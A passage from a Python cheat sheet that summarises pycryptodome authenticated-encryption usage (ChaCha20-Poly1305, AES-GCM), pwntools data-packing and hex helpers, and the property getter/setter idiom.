from <a href="https://www.pycryptodome.org/en/latest/">Crypto</a>.Cipher import <a href="https://www.pycryptodome.org/en/latest/src/cipher/chacha20_poly1305.html">ChaCha20_Poly1305</a>
key = get_random_bytes(32)
nonce = get_random_bytes(8|12|24) # len controls variant, default 12; 24 is XChaCha
cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
# --- OR ---
from Crypto.Cipher import AES
key = get_random_bytes(16)
nonce = get_random_bytes(16) # lib default 16 but RFC/interop suggests 12
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)

# if you pass in a nonce, save your own copy; cipher.nonce is a lie (!?)

cipher.update(assoc_data) # optional

ciphertext, tag = cipher.encrypt_and_digest(plaintext) # len(tag) = 16
# --- OR ---
plaintext = cipher.decrypt_and_verify(ciphertext, tag)

# or in steps:
ciphertext = cipher.encrypt(plaintext)  |  plaintext = cipher.decrypt(ciphertext)
tag = cipher.digest()                   |  cipher.verify(tag)
hextag = cipher.hexdigest()             |  cipher.hexverify(hextag)
</pre>
<h3>Pwntools</h3>
<pre>from pwn import *

enhex('=') = '3d' / unhex('3d') = ('=')
concat: List[List[T]] &rarr; List[T]
concat_all: recursive lists &rarr; flat list
findall(haystack, needle) &rarr; generator of all indices of needle in haystack

group(n, seq, underfull_action=['ignore'|'drop'|'fill'])

ordlist: List[int] &rarr; str
unordlist: str &rarr; List[int]

p8, p16, p32, p64 (  pack: int &rarr; bytes)
u8, u16, u32, u64 (unpack: bytes &rarr; int)

    You can pass endian='little'|'big', sign=False|True

more(text), yesno(text)</pre>

<h3>getter/setter</h3>
<pre>
class Foo:
    @property
    def bar(self): return self._bar
    @bar.setter
    def bar(self, value): self._bar = value
    @bar.deleter
    def bar(self): del self._bar</pre>
